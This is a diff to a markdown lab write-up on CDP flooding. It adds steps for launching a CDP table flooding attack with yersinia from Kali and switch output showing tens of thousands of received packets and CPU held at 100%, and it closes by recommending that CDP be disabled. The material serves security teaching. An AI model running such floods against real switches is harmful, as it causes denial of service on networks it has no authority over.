@@ -58,8 +58,41 @@ title: CDP flooding
     ```
     root@kali:~# yersinia -G
     ```
+    ![Success](./assets/yersinia.png)
 
+    Select Launch attack -> flooding CDP table
 
+    ![Success](./assets/attack.png)
 
-
-
+    The result of the attack can be seen in the following outputs.
+    ```
+    Switch#show cdp traffic
+    CDP counters :
+        Total packets output: 30, Input: 36432
+        Hdr syntax: 0, Chksum error: 0, Encaps failed: 0
+        No memory: 0, Invalid packet: 0,
+        CDP version 1 advertisements output: 5, Input: 36432
+        CDP version 2 advertisements output: 25, Input: 0
+    Switch#
+    ```
+    ```
+    Switch#show processes cpu history
+       999999999999999999999999999999999999999999999999999999999999
+       999999999999999999999999999999999999999999999999999999999999
+   100 **********************************************************
+    90 **********************************************************
+    80 **********************************************************
+    70 **********************************************************
+    60 **********************************************************
+    50 **********************************************************
+    40 **********************************************************
+    30 **********************************************************
+    20 **********************************************************
+    10 **********************************************************
+       0....5....1....1....2....2....3....3....4....4....5....5....6
+                 0    5    0    5    0    5    0    5    0    5    0
+                 CPU% per second (last 60 seconds)
+    ```
+    6. Conclusion
+    
+    It is recommended to disable CDP whenever possible.
